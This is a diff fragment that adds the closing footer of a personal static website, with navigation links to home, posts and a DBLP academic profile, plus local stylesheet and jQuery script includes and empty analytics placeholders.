+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://dblp.uni-trier.de/pers/hd/m/Meo:Federico_De">Academic</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
